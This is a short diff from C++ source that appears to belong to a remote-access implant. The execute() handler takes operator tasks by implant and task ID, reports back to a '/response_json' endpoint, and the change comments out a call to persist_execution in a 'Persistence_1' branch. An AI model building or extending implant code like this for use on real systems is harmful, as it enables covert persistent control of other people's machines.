@@ -20,7 +20,7 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
     if(command.compare("Persistence_1") == 0){
         try{
             std::string username = getUserName();
-            persist_execution(getUserName());
+            //persist_execution(getUserName());
         }
         catch(...){
             HttpResponse("/response_json", implant_id, task_id, "failed", "failure", command);
